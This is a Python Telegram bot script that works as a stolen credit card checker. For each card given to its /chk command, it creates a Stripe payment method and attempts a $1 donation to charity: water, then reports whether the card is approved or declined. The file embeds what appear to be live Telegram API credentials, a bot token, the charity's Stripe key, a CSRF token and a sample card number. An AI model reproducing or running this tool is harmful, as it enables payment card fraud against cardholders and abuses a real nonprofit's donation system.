import re
import aiohttp
from pyrogram import Client, filters

API_ID = 29569239           # your api_id
API_HASH = "b2407514e15f24c8ec2c735e8018acd7"
BOT_TOKEN = "8039426526:AAFSqWU-fRl_gwTPqYLK8yxuS0N9at1hC4s"

app = Client("checkerbot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

async def stripe_charitywater_check(cc, mm, yy, cvv):
    # 1st request to Stripe
    headers1 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }
    data1 = f'type=card&billing_details[address][postal_code]=10080&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=810+71st+Street&billing_details[email]=bt%40gmail.com&billing_details[name]=Bunny+Mm&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fd16ff171ee%3B+stripe-js-v3%2Fd16ff171ee%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=232560&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers1,
                data=data1,
                timeout=30
            ) as resp:
                op = await resp.json()
                payment_method_id = op.get("id", None)
                if not payment_method_id:
                    print("No payment_method id in first API response")
                    return f"❌ Stripe API Error: No payment_method id\nRaw Output:\n{op}"
    except Exception as e:
        return f"❌ Stripe Error: {e}"

    # 2nd request to CharityWater
    headers2 = {
        'authority': 'www.charitywater.org',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.charitywater.org',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-csrf-token': 'EMpJ4N902WC4B4RZdfV1aio9P1lFIaPB1OFjbNuv9IZPcNEVz9iHJKMED-tuKx0LJBEUb7zmOIpO4fCIH1cRzA',
        'x-requested-with': 'XMLHttpRequest',
    }
    cookies = {
        'countrypreference': 'US',
    }
    data2 = {
        'country': 'us',
        'payment_intent[email]': 'bt@gmail.com',
        'payment_intent[amount]': '1',
        'payment_intent[currency]': 'usd',
        'payment_intent[payment_method]': payment_method_id,
        'disable_existing_subscription_check': 'false',
        'donation_form[amount]': '1',
        'donation_form[name]': 'Bunny',
        'donation_form[surname]': 'Mm',
        'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
        'donation_form[email]': 'bt@gmail.com',
        'donation_form[address][address_line_1]': '810 71st Street',
        'donation_form[address][city]': 'New York',
        'donation_form[address][zip]': '10080',
    }
    try:
        async with aiohttp.ClientSession(cookies=cookies) as session:
            async with session.post(
                'https://www.charitywater.org/donate/stripe',
                headers=headers2,
                data=data2,
                timeout=30
            ) as resp:
                status = resp.status
                result = await resp.text()
                print("----- FULL RESPONSE FROM SITE -----")
                print(f"HTTP Status: {status}")
                print(result)
                print("-----------------------------------")
                if "succeeded" in result or "Thank you" in result:
                    return f"✅ Approved\nStatus: {status}"
                else:
                    return f"❌ Declined\nStatus: {status}\nRaw Output:\n{result[:4096]}"
    except Exception as e:
        return f"❌ Charitywater Error: {e}"

@app.on_message(filters.command("chk"))
async def check_card(client, message):
    if len(message.command) < 2:
        await message.reply("Send as: `/chk 5488093709170216|12|27|719`", quote=True)
        return
    cc_line = message.command[1]
    m = re.match(r"^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$", cc_line)
    if not m:
        await message.reply("Wrong format! Use: `/chk 5488093709170216|12|27|719`", quote=True)
        return
    cc, mm, yy, cvv = m.groups()
    msg = await message.reply("Checking, please wait...", quote=True)
    result = await stripe_charitywater_check(cc, mm, yy, cvv)
    await msg.edit(result)

print("Checker bot running!")
app.run()
